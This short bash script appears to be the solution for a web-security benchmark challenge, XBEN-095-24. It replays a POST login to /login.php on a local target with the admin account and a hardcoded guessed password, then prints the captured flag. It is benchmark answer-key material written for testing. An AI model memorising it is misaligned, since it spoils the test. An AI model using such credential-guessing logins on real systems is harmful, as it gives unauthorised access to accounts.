#!/usr/bin/env bash
# XBEN-095-24 — weak/guessable admin credentials. Proxy-mode twin. The admin
# account's password (ThisIsBestPassword) logs in at /login.php, and the
# authenticated area holds the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben095p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login.php' \
  --set 'form.username=admin' --set 'form.password=ThisIsBestPassword' >/dev/null
print_flag
